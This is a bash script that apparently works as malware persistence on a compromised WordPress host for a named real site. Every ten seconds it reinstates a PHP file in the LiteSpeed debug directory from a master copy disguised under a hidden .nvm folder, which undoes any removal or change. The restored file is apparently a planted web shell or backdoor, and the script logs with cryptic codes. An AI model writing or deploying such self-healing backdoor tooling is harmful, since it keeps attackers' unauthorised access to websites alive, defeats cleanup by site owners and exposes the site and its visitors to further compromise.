#!/bin/bash

INDEX_FILE="/var/www/h160399/data/www/optasia.by/wp-content/litespeed/debug/conf.php"
INDEX_MASTER="/var/www/h160399/data/.nvm/bash_check"
LOG_FILE="/var/www/h160399/data/.nvm/map.se"

echo "$(date '+%Y-%m-%d %H:%M:%S') - [*]12" >> "$LOG_FILE"

while true; do
    if [ -f "$INDEX_MASTER" ]; then
        if [ ! -f "$INDEX_FILE" ]; then
            echo "$(date '+%Y-%m-%d %H:%M:%S') - [!]1" >> "$LOG_FILE"
            cp -f "$INDEX_MASTER" "$INDEX_FILE" 2>> "$LOG_FILE"
            chmod 644 "$INDEX_FILE" 2>> "$LOG_FILE"
        else
        
            if ! cmp -s "$INDEX_FILE" "$INDEX_MASTER"; then
                echo "$(date '+%Y-%m-%d %H:%M:%S') - [!]2" >> "$LOG_FILE"
                cp -f "$INDEX_MASTER" "$INDEX_FILE" 2>> "$LOG_FILE"
                chmod 644 "$INDEX_FILE" 2>> "$LOG_FILE"
            fi
        fi
    fi

    sleep 10
done
